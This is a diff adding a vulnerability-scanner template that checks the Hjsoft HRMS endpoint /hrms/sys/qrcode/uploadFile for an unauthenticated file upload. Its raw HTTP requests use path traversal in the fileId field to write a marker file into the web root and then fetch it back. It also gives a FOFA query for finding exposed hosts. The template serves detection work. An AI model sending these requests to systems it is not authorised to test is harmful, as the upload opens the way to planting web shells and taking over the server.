@@ -1,0 +1,43 @@
+id: hjsoft-sys-qrcode-uploadfile-fileupload
+info:
+  name: 宏景人力资源信息管理系统 /hrms/sys/qrcode/uploadFile - fileupload
+  author: leadlife
+  severity: critical
+  description: todo
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-qeury: app="hjsoft"
+  tags: hjsoft,fileupload
+
+http:
+  - raw:
+      - |+
+        POST /hrms/sys/qrcode/uploadFile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykgrlwwym
+        Content-Length: 307
+
+        ------WebKitFormBoundarykgrlwwym
+        Content-Disposition: form-data; name="fileId"
+
+        ../webapps/hrms/testld
+        ------WebKitFormBoundarykgrlwwym
+        Content-Disposition: form-data; name="file"; filename="testld.txt"
+        Content-Type: application/vnd.ms-excel
+
+        envleqhhadvwnloh
+        ------WebKitFormBoundarykgrlwwym--
+
+      - |+
+        GET /hrms/testld.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200"
+          - "contains(body_1,'success')"
+          - "contains(body_2,'envleqhhadvwnloh')"
+        condition: and
